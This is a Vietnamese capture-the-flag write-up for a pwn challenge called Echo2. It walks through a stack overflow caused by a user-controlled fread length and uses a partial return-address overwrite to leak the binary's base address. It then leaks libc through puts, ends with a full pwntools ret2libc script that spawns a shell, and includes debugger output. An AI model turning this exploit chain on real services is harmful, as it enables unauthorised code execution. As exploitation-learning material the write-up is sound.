# Echo2

## Source code

```c
int echo()
{
  char ptr[264]; // [rsp+0h] [rbp-110h] BYREF
  int v2[2]; // [rsp+108h] [rbp-8h] BYREF

  puts("Welcome to Echo2");
  v2[1] = __isoc99_scanf("%d", v2);
  fread(ptr, 1uLL, v2[0], stdin);
  return printf("Echo2: %s\n", ptr)
  }

  int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  echo();
  puts("Goodbye from Echo2");
  return 0;
}
```
Chall này có code khá ngắn nhưng mà độ khoai thì tỉ lệ thuận với độ ngắn =)) Đi qua một chút về chương trình: đầu tiên ta có hàm main chỉ có mục đích là gọi hàm echo. Hàm echo sẽ khởi tạo biến ptr với độ lớn 264 byte và một mảng int v2 gồm 2 phần tử. Sau đó sẽ cho mình nhập một số vào v2[0] thông qua hàm scanf (hàm scanf trả về số lượng đối số được gán thành công) rồi gán vào v2[1] (trường hợp này sẽ là 1). Rồi gọi tới hàm fread đọc v[0] phần tử với mỗi phần tử có độ lớn là 1 byte và ghi vào ptr. Đây rõ ràng là bof bug, vì cho phép nhập số lượng byte tùy ý trong khi ptr chứa nó chỉ cố định ở 264 byte, nếu ta khai báo v2[0] nhiều hơn thì chắc chắn sẽ tràn rồi =))

Chạy thử và nhìn vào stack ta sẽ thấy retAddr đang nằm trong này, mình sẽ thử tính toán offset để xem thử có thể overwrite rip hay không.

```java
0x00007fffffffdef0│+0x0000: 0x000000000000740a ("\nt"?)  ← $rsp
...

0x00007fffffffe000│+0x0110: 0x00007fffffffe010  →  0x0000000000000001    ← $rbp
0x00007fffffffe008│+0x0118: 0x00005555555552b3  →  <main+108> lea rax, [rip+0xd69]        # 0x555555556023
gef➤  p/d 0x00007fffffffe008 - 0x00007fffffffdef0
$1 = 280
```
Mình sẽ gửi payload

```python
payload = b'A'*280
payload += b'BBBBBBBB'
```
```java
───────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007ffd3934d348│+0x0000: 0x4242424242424241   ← $rsp
0x00007ffd3934d350│+0x0008: 0x0000000000000001
0x00007ffd3934d358│+0x0010: 0x00007fc661fa1d90  →   mov edi, eax
0x00007ffd3934d360│+0x0018: 0x0000000000000000
0x00007ffd3934d368│+0x0020: 0x00005578da42f247  →  <main+0> endbr64
0x00007ffd3934d370│+0x0028: 0x000000013934d450
0x00007ffd3934d378│+0x0030: 0x00007ffd3934d468  →  0x00007ffd3934e3b0  →  "/mnt/c/ctf/wctf/echo2/challenge_patched"
0x00007ffd3934d380│+0x0038: 0x0000000000000000
─────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5578da42f23f <echo+118>       call   0x5578da42f0b0 <printf@plt>
   0x5578da42f244 <echo+123>       nop
   0x5578da42f245 <echo+124>       leave
 → 0x5578da42f246 <echo+125>       ret
[!] Cannot disassemble from $PC
─────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "challenge_patch", stopped 0x5578da42f246 in echo (), reason: SIGSEGV
```
Đã có thể overwrite được retAddr nhưng rip lại không nhận giá trị này và gây là lỗi SIGSEGV? Có lẽ ta nên tìm cách khác. Ơ nhưng mà rõ ràng mình gửi 8byte B mà sao đây chỉ có 7byte nhỉ? Nó đã thay thế cho ký tự \0 chăng? Đến đây thì mình phát hiện rằng ta có thể chỉ gửi 279 byte + null byte hoặc là sẽ gửi full 280 byte và overwrite luôn cả null byte, lúc đó retAddr nằm ngay sau đó sẽ được in ra cùng với input của mình vậy là hoàn toàn có thể leak ra các địa chỉ trên stack. Vậy là mình sẽ tìm cách leak các địa chỉ của exe và libc. Mode RELRO enable nên k thể overwrite được got có lẽ mình sẽ exploit bằng ret2libc. Nhưng vấn đề là phải cho echo chạy về main một lần nữa để có thể leak được nhiều lần. Thế thì mình sẽ gửi payload overwrite retAddr là địa chỉ của main.

```python
payload = b'A'*280
payload += p64(exe.sym['main'])
```
```java
...
0x00007fffd990cfd0│+0x0110: 0x4141414141414141   ← $rbp
0x00007fffd990cfd8│+0x0118: 0x0000000000124741
...
```
Bằng một cách thần kì nào đó ta không thể ghi địa chỉ của main vào và có một ký tự A bị lọt vào. Sửa lại payload một chút
```python
payload = b'A'*279
payload += p64(exe.sym['main'])
```
Lần này có ổn hơn một chút nhưng mình lại phát hiện ra vấn đề khác: không hiểu sao địa chỉ của hàm main nó lại lạ ntn nữa =))
```java
[DEBUG] Sent 0x11f bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000110  41 41 41 41  41 41 41 47  12 00 00 00  00 00 00     │AAAA│AAAG│····│···│
    0000011f
```
Nhờ bật mode debug mới phát hiện được, mình đã thử nhảy vào các vị trí khác trong main nhưng mà vẫn thế =)) nó chỉ có 2 byte sau, còn mấy byte đầu pay màu hết. Chạy đi chạy lại cả chục lần thì mình thấy là dù cho các byte đầu có thay đổi thì byte cuối của nó vẫn giữ nguyên (retAddr của echo luôn kết thúc = \xb3, hàm main có byte cuối luôn = \x47) và chỉ cần thay đổi cái này là được. Khi đã chạy lại đầu hàm main được rồi lại có thêm lỗi `xmm1`(mệt vl =))) `movaps XMMWORD PTR [rbp-0x600], xmm1` nên mình sẽ cho chạy vào địa chỉ khác trong main. Mình sẽ cho nhảy vào main + 5 có đuôi là \x4c, đồng thời leak được địa chỉ này ra
```java
[DEBUG] Received 0x126 bytes:
    00000000  45 63 68 6f  32 3a 20 0a  41 41 41 41  41 41 41 41  │Echo│2: ·│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000110  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 4c  │AAAA│AAAA│AAAA│AAAL│
    00000120  c2 bd 3b 78  55 0a                                  │··;x│U·│
    00000126
Echo2:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAL½;xU
```
Ta sẽ tính toán offset ở địa chỉ này để lấy được exe_base 
```java
gef➤  p/d 0x000055783bbdc24c - 0x000055783bbdb000
$1 = 4684
```
Giờ chỉ còn thiếu địa chỉ của libc nữa là có thể tiến hành tạo shell được rồi. Sau ret 8 byte có 1 địa chỉ nằm trong libc, mình định leak nó ra bằng pad thêm 8byte để nó overwrite null byte nhưng không được (lmao). 
```java
gef➤
...
0x00007fffd3694310│+0x0110: 0x4141414141414141   ← $rbp
0x00007fffd3694318│+0x0118: 0x0000555f680c824c  →  <main+5> mov rbp, rsp
0x00007fffd3694320│+0x0120: 0x4141414141414141
0x00007fffd3694328│+0x0128: 0x00007f1f06ea7d90  →   mov edi, eax
0x00007fffd3694330│+0x0130: 0x0000000000000000
0x00007fffd3694338│+0x0138: 0x0000555f680c8247  →  <main+0> endbr64
```
```java
[DEBUG] Received 0x127 bytes:
    00000000  45 63 68 6f  32 3a 20 0a  41 41 41 41  41 41 41 41  │Echo│2: ·│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000120  4c 02 04 9b  8b 55 0a                               │L···│·U·│
    00000127
Echo2:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAL\x04\x8bU
```
Ngó lại thì thấy trước khi leave trong thanh ghi rdi có chứa một địa chỉ trong libc vậy nên mình nghĩ có thể leak nó ra thông qua printf hoặc puts. Mình sẽ dùng puts. Overwrite địa chỉ của puts ở echo retAddr và push ngay sau đó là địa chỉ của main để sau khi puts leak thành công địa chỉ trong rdi sẽ nhảy vào main và tiếp tục thực hiện chương trình. 

```java
payload2 = b'A'*279
payload2 += p64(exe.plt['puts'])
payload2 += p64(exe.sym['main']+5)

r.sendlineafter(b'Echo2\n',b'296')
r.send(payload2)
```
Giờ là công đoạn tạo shell. Sử dụng ROPgadget để tìm các gadget
```java
0x000000000002a745 : pop rdi ; pop rbp ; ret
0x000000000002a3e5 : pop rdi ; ret
0x00000000001bc10d : pop rdi ; ret 0xffe6
```
payload mình gửi sẽ như thế này
```python
rdi = libc.address + 0x2a3e5
bin_sh = next(libc.search(b"/bin/sh"))
libc_ret = libc.address + 0x29cd6
payload3 = b'C'*279
payload3 += p64(rdi)
payload3 += p64(bin_sh)
payload3 += p64(libc.sym['system'])
  ```
Đến đây mình bị lỗi xmm1 nên sẽ tìm ret gadget nào đó trong libc để nhảy vào
```java
...
0x0000000000029cd6 : ret
...
```
Lệnh ret này lại bị lỗi =)) Với lại không hiểu tại sao trong stack lại xuất hiện input của lần 2 mình nhập vào nên chắc mình sẽ tìm cái ret nào đó trong file binary để sửa luôn lần nhập thứ 2 tránh bị xmm :(( 

```java
0x000000000000101a : ret
```
```java
[*] Switching to interactive mode
[DEBUG] Received 0x126 bytes:
    00000000  45 63 68 6f  32 3a 20 0a  43 43 43 43  43 43 43 43  │Echo│2: ·│CCCC│CCCC│
    00000010  43 43 43 43  43 43 43 43  43 43 43 43  43 43 43 43  │CCCC│CCCC│CCCC│CCCC│
    *
    00000110  43 43 43 43  43 43 43 43  43 43 43 43  43 43 43 e5  │CCCC│CCCC│CCCC│CCC·│
    00000120  c3 b6 a5 9a  7f 0a                                  │····│··│
    00000126
Echo2:
CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC\xe5ö\xa5\x9a\x7f
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x63 bytes:
    b'Dockerfile  challenge_patched\t   ld-2.35.so  solve.py\n'
    b'challenge   challenge_patched.i64  libc.so.6\n'
Dockerfile  challenge_patched       ld-2.35.so  solve.py
challenge   challenge_patched.i64  libc.so.6
$
```
full script :
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./challenge_patched", checksec=False)
libc = ELF("./libc.so.6",checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    # gdb.attach(r, gdbscript='''
    # b *echo
    # c
    # ''')
    # input()

    #round 1
    payload = b'A'*279
    payload += b'\x4c'
 
    r.sendlineafter(b'Echo2\n',b'281')
    r.send(payload)
    r.recvline()
    r.recv(279)
    exe_leak = u64(r.recv(6).ljust(8, b'\0'))
    exe.address = exe_leak - 4684
    log.info('exe_base :' + hex(exe.address))
    ret = exe.address + 0x101a # ret
    #round 2
    payload = b'B'*279
    payload += p64(exe.plt['puts'])
    payload += p64(ret)
    payload += p64(exe.sym['main']+103)
 
    r.sendlineafter(b'Echo2\n',b'304')
    r.send(payload)
    r.recv(0x126)
    libc_leak = u64(r.recv(6).ljust(8,b'\0'))
    libc.address = libc_leak - 401616
    log.info("libc_leak :"+ hex(libc.address))
    
    r.recvline()
    rdi = libc.address + 0x2a3e5
    bin_sh = next(libc.search(b"/bin/sh"))

    #round 3
    payload3 = b'C'*279
    payload3 += p64(rdi)
    payload3 += p64(bin_sh)
    payload3 += p64(ret)
    payload3 += p64(libc.sym['system'])# nếu để ret sau sẽ bị lỗi xmm1 nên phải để trước system
 
    r.sendlineafter(b'Echo2\n',b'312')
    r.send(payload3)

    r.interactive()


if __name__ == "__main__":
    main()

```